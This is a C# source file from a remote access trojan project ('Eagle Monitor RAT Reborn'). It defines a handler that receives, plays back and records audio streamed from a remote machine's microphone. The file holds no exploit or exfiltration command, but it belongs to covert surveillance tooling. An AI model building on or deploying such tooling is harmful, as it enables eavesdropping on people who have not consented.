using NAudio.Wave;
using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.Network
{
    internal class RemoteMicrophoneHandler : IDisposable
    {
        internal RemoteMicrophoneHandler()
        {
            waveOut = new WaveOut();
            bufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(44100, 1));
        }
        internal ClientHandler clientHandler { get; set; }
        internal WaveOut waveOut { get; set; }
        internal BufferedWaveProvider bufferedWaveProvider { get; set; }
        internal string currentFileName { get; set; }
        internal int currentOffset { get; set; }
        internal WaveFileWriter waveFileWriter { get; set; }
        internal bool hasAlreadyConnected { get; set; }
        public void Dispose() 
        {
            clientHandler.socket.Close();
            if (clientHandler.socket != null)
            {
                clientHandler.socket.Dispose();
                clientHandler.socket = null;
                clientHandler = null;
            }

            this.waveFileWriter.Close();
            this.bufferedWaveProvider.ClearBuffer();
            this.currentFileName = "";
        }
    }
}
